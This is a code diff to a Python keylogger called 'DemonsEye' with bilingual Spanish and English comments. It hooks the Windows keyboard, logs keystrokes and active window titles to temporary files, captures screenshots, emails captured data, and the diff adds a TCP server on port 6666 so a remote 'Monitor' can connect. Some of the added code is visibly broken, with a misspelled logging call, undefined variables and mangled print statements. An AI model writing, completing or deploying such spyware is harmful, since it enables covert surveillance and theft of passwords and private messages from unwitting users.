@@ -72,12 +72,13 @@ import wx
 ########################################################
 # CONSTANTES - CONSTANTS
 ########################################################
-VERSIONS = "1.0"            # Version
-DEBUG = 1                   # Enable Debug
-CRLF = '\n'                 # salto de linea - line feed
-KLGPRE = 'klg_'             # prefijo nombre ficheros de log - prefix name for log files
-KLGEXT = '.dek'             # extension nombre ficheros keylogger - extension file name for keylogger
-KEYCODE_EXIT = 7            # CTRL + G > combinación especial para cerrar keylogger - key to close keylogger
+APPNAME = "DemonsEye"           # Just a name
+VERSIONS = "1.0"                # Version
+LOGGING_LEVEL = logging.DEBUG   # Log Level Debug. Can be -> DEBUG, INFO, WARNING, ERROR, CRITICAL
+CRLF = '\n'                     # salto de linea - line feed
+KLGPRE = 'klg_'                 # prefijo nombre ficheros de log - prefix name for log files
+KLGEXT = '.dek'                 # extension nombre ficheros keylogger - extension file name for keylogger
+KEYCODE_EXIT = 7                # CTRL + G > combinación especial para cerrar keylogger - key to close keylogger
 
 
 ########################################################
@@ -117,24 +118,74 @@ threadList = []
 # CLASES - CLASSES
 ########################################################
 
-# Clase con metodo que toma captura de pantalla y despues la envia
+# Clase multihilo con metodo que toma captura de pantalla y despues la envia a servicios remotos
+# Threading class to capture screenshot and send to remote services
 class ScreenShootThread (threading.Thread):
-   def __init__(self, screen_filename):
-      threading.Thread.__init__(self)
-      self.screen_file = screen_filename
-   def run(self):
-      print("Guardado captura " + self.screen_file)
-      app = wx.App()  # Need to create an App instance before doing anything
-      screen = wx.ScreenDC()
-      size_x, size_y = screen.GetSize()
-      bmp = wx.EmptyBitmap(size_x, size_y, -1)
-      mem = wx.MemoryDC(bmp)
-      mem.Blit(0, 0, size_x, size_y, screen, 0, 0)
-      del mem  # libera memoria que contiene captura de imagen
-      del app  # libera objeto de instancia de la aplicación
-      bmp.SaveFile(self.screen_file, wx.BITMAP_TYPE_PNG)
-      print("Fin captura " + self.screen_file)
+    def __init__(self, screen_filename):
+        threading.Thread.__init__(self)
+        self.screen_file = screen_filename
 
+   def run(self):
+        logging.info("Guardado captura " + self.screen_file)
+        app = wx.App()  # Need to create an App instance before doing anything
+        screen = wx.ScreenDC()
+        size_x, size_y = screen.GetSize()
+        bmp = wx.EmptyBitmap(size_x, size_y, -1)
+        mem = wx.MemoryDC(bmp)
+        mem.Blit(0, 0, size_x, size_y, screen, 0, 0)
+        del mem  # libera memoria que contiene captura de imagen
+        del app  # libera objeto de instancia de la aplicación
+        bmp.SaveFile(self.screen_file, wx.BITMAP_TYPE_PNG)
+        loggin.info("Fin captura " + self.screen_file)
+        # Send screenshot to remote servers
+        # ... pending ...
+
+
+# Clase multihilo que pone un servidor a la escucha para recibir peticiones del Monitor y
+# crea un cliente para la respuesta
+# Threading class to listen Monitor petitions and create clients for response
+
+# Server constants
+SERVER_IP = ''
+SERVER_PORT = 6666
+SERVER_BUFFER_SIZE = 64
+
+class ClientThread(threading.Thread):
+    def __init__(self, ip, port):
+        threading.Thread.__init__(self)
+        self.ip = ip
+        self.port = port
+        logging.info("Recibida petición de Monitor desde " + ip + ":" + str(port))
+
+    def run(self):
+        while True:
+            data = conn.recv(2048)
+            print
+            "Server received data:", data
+            MESSAGE = raw_input("Multithreaded Python server : Enter Response from Server/Enter exit:")
+            if MESSAGE == 'exit':
+                break
+            conn.send(MESSAGE)  # echo
+
+class ServerListenerThread (threading.Thread):
+    def __init__(self):
+        threading.Thread.__init__(self)
+        self.name = APPNAME
+        self.threads = []
+        logging.debug('Creando servidor en IP '+ip+' y puerto '+port)
+
+    def run(self):
+        tcpServer = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        tcpServer.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        tcpServer.bind((SERVER_IP, SERVER_PORT))
+
+        while True:
+            tcpServer.listen(5)            # 5 clients are more than enough. Normally there is only 1 monitor.
+            logging.info("Demon's Eye Keylogger server : Waiting connection from Monitor...")
+            (conn, (ip, port)) = tcpServer.accept()
+            newthread = ClientThread(ip, port)
+            newthread.start()
+            self.threads.append(newthread)
 
 
 ########################################################
@@ -197,7 +248,7 @@ def send_email(message):
         server.quit()
 
     except:
-        logging.debug('No he podido enviar mensaje')
+        logging.error('No he podido enviar mensaje')
         pass
 
 
@@ -248,7 +299,8 @@ def register_window_name(text):
 # it to the external service.
 def capture_screen():
     global key_buffer
-    screen_file = 'scr' + datetime.datetime.now().strftime("%y%m%d%H%M") + '.png'
+    tmp_folder = tempfile.gettempdir() + "\\"
+    screen_file = tmp_folder + 'scr' + datetime.datetime.now().strftime("%y%m%d%H%M") + '.png'
     key_buffer += CRLF + CRLF + '[SCREENSHOT] ' + screen_file + CRLF
     pantalla = ScreenShootThread(screen_file)
     pantalla.start()
@@ -276,7 +328,7 @@ def delete_keylog_tempfile(pattern = None):
 
     folder_files = tempfile.gettempdir() + "\\" + pattern
     for file_remove in glob.glob(folder_files):
-        logging.debug('Delete Temporal file: ' + file_remove)
+        logging.info('Delete Temporal file: ' + file_remove)
         os.remove(file_remove)
 
     return
@@ -290,7 +342,7 @@ def create_keylog_file():
     # Create keylog file in the user's temporary folder
     prefix = KLGPRE + datetime.datetime.now().strftime("%y%m%d%H%M")
     ftemp, keylog_name = tempfile.mkstemp(KLGEXT, prefix)
-    logging.debug('Create keylogger file ' + keylog_name)
+    logging.info('Create keylogger file ' + keylog_name)
     f = open(keylog_name, 'w+')
     f.close()
 
@@ -393,28 +445,30 @@ def on_keyboard_event(event):
     logging.debug('Injected: ' + repr(event.Injected) + ' Alt: ' + repr(event.Alt))
     logging.debug('Transition: ' + repr(event.Transition))
 
-    # presiona CTRL+E para salir y desactivar el KeyLogger
+    # Si presiona combinación especial para salir y desactivar el KeyLogger
+    # If especial key to close keylogger is pressed
     if event.Ascii == KEYCODE_EXIT:
         msg = 'Cerrando aplicación por combinación especial de tecla ' + repr(event.Ascii)
-        logging.debug(msg)
+        logging.info(msg)
         key_buffer += CRLF + CRLF + "[" + msg + "]" + CRLF
         sys.exit(0)
 
-    # si el usuario cambia de ventana, la registra
+    # Si el usuario cambia de ventana, la registra
+    # If user change active window
     if (old_event == None or event.WindowName != old_event.WindowName) and event.WindowName != None:
         register_window_name(repr(event.WindowName))
 
-    # guarda caracter en el buffer
+    # guarda caracter en el buffer - save key to buffer
     add_key_to_buffer(event)
 
-    # guarda evento actual para comparar con el siguiente
-    # y poder controlar si se mantienen pulsadas teclas especiales
-    # o saber si se cambia de ventana
+    # Guarda evento actual para comparar con el siguiente y poder controlar si se mantienen pulsadas teclas especiales
+    # o saber si se cambia de ventana.
+    # Saves current event info to compare with next one.
     old_event = event
 
     return True
 
-# función que ejecutará al cerrar el programa
+# Función que ejecutará al cerrar el programa - Whe program is closed
 def on_close_program():
     global key_buffer, threadList
 
@@ -429,12 +483,13 @@ def on_close_program():
     # ejecuta captura de pantalla
     capture_screen()
 
-    # borra ficheros temporales
-
     # espera que finalicen todos los threads que pueda haber activos
     for thr in threadList:
         thr.join()
 
+    # borra ficheros temporales
+
+    logging.shutdown()
     return
 
 
@@ -443,7 +498,9 @@ def on_close_program():
 ########################################################
 
 # Establece log de depuración - Set debug log
-logging.basicConfig(filename='pkLogger.log',filemode='w',level=logging.DEBUG, format='%(asctime)s - %(levelname)s : %(message)s')
+logFormat = '%(asctime)s %(levelname)s:%(message)s'
+logDateFmt = '%d/%m/%Y %I:%M:%S %p'
+logging.basicConfig(filename='DEKlogger.log',filemode='w',level=LOGGING_LEVEL,format=logFormat,datefmt=logDateFmt)
 
 # Inicializa variables con información del sistema y el usuario - Init some useful variables
 cpu = platform.processor()
@@ -482,6 +539,11 @@ hm.HookKeyboard()
 # Registra handler de la función que se ejecutará al terminar la aplicación
 # Handler to do actions when application is closed
 atexit.register(on_close_program)
+
+# Crea Servidor a la escucha de peticiones TCP del Monitor
+# Create server that listens TCP petitions from Monitor
+server = ServerListenerThread()
+server.start()
 
 # Espera indefinidamente hasta que se produce combinación de salida del keylogger - Wait indefinitely
 pythoncom.PumpMessages()
